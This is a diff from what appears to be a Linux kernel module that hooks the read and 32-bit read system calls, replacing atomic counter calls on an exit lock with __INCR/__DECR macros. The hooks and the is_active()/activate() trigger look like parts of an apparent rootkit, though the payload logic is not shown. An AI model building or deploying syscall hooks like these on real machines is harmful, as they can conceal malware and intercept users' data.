@@ -3,14 +3,14 @@
 asmlinkage ssize_t (*real_sys_read)(unsigned int fd, char __user *buf, size_t count);
 asmlinkage ssize_t hooked_sys_read(unsigned int fd, char __user *buf, size_t count){
 
-	atomic_inc(&exit_lock);
+	__INCR(read);
 
 	ssize_t r;
 	r = (*real_sys_read)(fd, buf, count);
 
 	if(!is_active()){
 
-		atomic_dec(&exit_lock);
+		__DECR(read);
 
 		return r;
 
@@ -42,7 +42,7 @@ asmlinkage ssize_t hooked_sys_read(unsigned int fd, char __user *buf, size_t cou
 
 		activate();
 
-		atomic_dec(&exit_lock);
+		__DECR(read);
 
 		return r;
 
@@ -53,14 +53,14 @@ asmlinkage ssize_t hooked_sys_read(unsigned int fd, char __user *buf, size_t cou
 asmlinkage ssize_t (*real_sys32_read)(unsigned int fd, char __user *buf, size_t count);
 asmlinkage ssize_t hooked_sys32_read(unsigned int fd, char __user *buf, size_t count){
 
-	atomic_inc(&exit_lock);
+	__INCR32(read);
 
 	ssize_t r;
 	r = (*real_sys32_read)(fd, buf, count);
 
 	if(!is_active()){
 
-		atomic_dec(&exit_lock);
+		__DECR32(read);
 
 		return r;
 
@@ -93,7 +93,7 @@ asmlinkage ssize_t hooked_sys32_read(unsigned int fd, char __user *buf, size_t c
 
 		activate();
 
-		atomic_dec(&exit_lock);
+		__DECR32(read);
 
 		return r;
 	}
